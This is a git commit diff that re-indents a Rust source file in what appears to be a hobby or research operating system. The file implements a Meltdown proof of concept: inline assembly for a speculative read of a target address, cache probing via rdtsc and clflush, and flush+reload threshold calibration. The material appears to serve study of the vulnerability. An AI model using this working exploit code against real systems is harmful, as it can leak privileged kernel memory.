3dce040d4946ba0a127d824fc3918dc69977ea3a
Lu Ro <public@lrose.de>
2025-09-04 14:22:14 +0200

    meltdown: use tab indentation coherently

--- os/application/meltdown/src/meltdown.rs
+++ os/application/meltdown/src/meltdown.rs
@@ -38,98 +38,98 @@ pub struct Config {
 }
 
 pub fn meltdown(mem: &[MemoryPage], pointer: *const u8) {
-    unsafe {
-        asm!(
-            "2:", // jump here to restart if shift result was 0
-            "mov {tmp3}, [{tmp3}]", // this uses rsi in original, which is 0 and segfaults
-            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
-            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
-            "jz 2", // restart if shift result was 0
-            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
-            x = in(reg) pointer,
-            base = in(reg) &mem[0] as *const MemoryPage,
-            tmp = out(reg) _,
-            tmp2 = out(reg) _,
-            tmp3 = out(reg) _,
-        );
-    }
+	unsafe {
+		asm!(
+			"2:", // jump here to restart if shift result was 0
+			"mov {tmp3}, [{tmp3}]", // this uses rsi in original, which is 0 and segfaults
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+			"jz 2", // restart if shift result was 0
+			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+			x = in(reg) pointer,
+			base = in(reg) &mem[0] as *const MemoryPage,
+			tmp = out(reg) _,
+			tmp2 = out(reg) _,
+			tmp3 = out(reg) _,
+		);
+	}
 }
 
 pub fn meltdown_nonull(mem: &[MemoryPage], pointer: *const u8) {
-    unsafe {
-        asm!(
-            "2:", // jump here to restart if shift result was 0
-            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
-            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
-            "jz 2", // restart if shift result was 0
-            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
-            x = in(reg) pointer,
-            base = in(reg) &mem[0] as *const MemoryPage,
-            tmp = out(reg) _,
-            tmp2 = out(reg) _,
-        );
-    }
+	unsafe {
+		asm!(
+			"2:", // jump here to restart if shift result was 0
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+			"jz 2", // restart if shift result was 0
+			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+			x = in(reg) pointer,
+			base = in(reg) &mem[0] as *const MemoryPage,
+			tmp = out(reg) _,
+			tmp2 = out(reg) _,
+		);
+	}
 }
 
 pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
-    unsafe {
-        asm!(
-            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
-            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
-            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
-            x = in(reg) pointer,
-            base = in(reg) &mem[0] as *const MemoryPage,
-            tmp = out(reg) _,
-            tmp2 = out(reg) _,
-        );
-    }
+	unsafe {
+		asm!(
+			"movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+			"shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+			"mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
+			x = in(reg) pointer,
+			base = in(reg) &mem[0] as *const MemoryPage,
+			tmp = out(reg) _,
+			tmp2 = out(reg) _,
+		);
+	}
 }
 
 pub fn rdtsc() -> u64 {
-    let high: u32;
-    let low: u32;
-    unsafe {
-        asm!(
-            "mfence", // Apparently it was the mfence instructions here which caused all memory accesses to be fast (below threshold), making meltdown attack impossible
-            "rdtsc",
-            "mfence", // TODO: This is after combining both 32bit parts of the result in the original, i.e. the last line before return
-            out("eax") low, // TODO: Can we use rax and rdx instead, to skip combining?
-            out("edx") high
-        );
-    }
-    ((high as u64) << 32) | (low as u64)
+	let high: u32;
+	let low: u32;
+	unsafe {
+		asm!(
+			"mfence", // Apparently it was the mfence instructions here which caused all memory accesses to be fast (below threshold), making meltdown attack impossible
+			"rdtsc",
+			"mfence", // TODO: This is after combining both 32bit parts of the result in the original, i.e. the last line before return
+			out("eax") low, // TODO: Can we use rax and rdx instead, to skip combining?
+			out("edx") high
+		);
+	}
+	((high as u64) << 32) | (low as u64)
 }
 
 pub fn maccess(pointer: *const MemoryPage) {
-    unsafe {
-        asm!(
-            "mov {tmp}, [{x}]",
-            x = in(reg) pointer,
-            tmp = out(reg) _,
-        );
-    }
+	unsafe {
+		asm!(
+			"mov {tmp}, [{x}]",
+			x = in(reg) pointer,
+			tmp = out(reg) _,
+		);
+	}
 }
 
 pub fn flush(pointer: *const MemoryPage) {
-    unsafe {
-        asm!(
-            "clflush [{x}]",
-            x = in(reg) pointer,
-        );
-    }
+	unsafe {
+		asm!(
+			"clflush [{x}]",
+			x = in(reg) pointer,
+		);
+	}
 }
 
 pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bool {
-    let start_time: u64;
-    let end_time: u64;
-    
-    start_time = rdtsc();
-    maccess(pointer);
-    end_time = rdtsc();
-    
-    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
-    
-    end_time - start_time < cache_miss_threshold
+	let start_time: u64;
+	let end_time: u64;
+	
+	start_time = rdtsc();
+	maccess(pointer);
+	end_time = rdtsc();
+	
+	flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
+	
+	end_time - start_time < cache_miss_threshold
 }
 
 struct SegfaultHandler {
@@ -216,36 +216,36 @@ pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPa
 }
 
 pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
-    let mut reload_time: u64 = 0;
-    let mut flush_reload_time: u64 = 0;
-    let count: u64 = 10000000;
-    let mut start_time: u64;
-    let mut end_time: u64;
-    
-    // TODO Use single value instead of array ok?    
-    maccess(pointer);
-    for _ in 0..count {
-        start_time = rdtsc();
-        maccess(pointer);
-        end_time = rdtsc();
-        reload_time += end_time - start_time;
-    }
-    
-    for _ in 0..count {
-        start_time = rdtsc();
-        maccess(pointer);
-        end_time = rdtsc();
-        flush(pointer);
-        flush_reload_time += end_time - start_time;
-    }
-    
-    println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
-    reload_time /= count;
-    flush_reload_time /= count;
-    println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
-    let threshold = (flush_reload_time + reload_time * 2) / 3;
-    println!("Threshold: {}", threshold);
-    return threshold;
+	let mut reload_time: u64 = 0;
+	let mut flush_reload_time: u64 = 0;
+	let count: u64 = 10000000;
+	let mut start_time: u64;
+	let mut end_time: u64;
+	
+	// TODO Use single value instead of array ok?    
+	maccess(pointer);
+	for _ in 0..count {
+		start_time = rdtsc();
+		maccess(pointer);
+		end_time = rdtsc();
+		reload_time += end_time - start_time;
+	}
+	
+	for _ in 0..count {
+		start_time = rdtsc();
+		maccess(pointer);
+		end_time = rdtsc();
+		flush(pointer);
+		flush_reload_time += end_time - start_time;
+	}
+	
+	println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
+	reload_time /= count;
+	flush_reload_time /= count;
+	println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
+	let threshold = (flush_reload_time + reload_time * 2) / 3;
+	println!("Threshold: {}", threshold);
+	return threshold;
 }
 
 fn print_thread() {
@@ -468,8 +468,8 @@ pub fn main() {
 		}
 		mem = Vec::from_raw_parts(ptr as *mut MemoryPage, ARRAY_SIZE, ARRAY_SIZE);
 	}
-    
-    for i in 0..ARRAY_SIZE {
+	
+	for i in 0..ARRAY_SIZE {
 		let cur_ptr = &mem[i] as *const MemoryPage;
 		// Construct the correct value: 16 bytes each containing the value of i
 		let mut correct_value = i as u128;
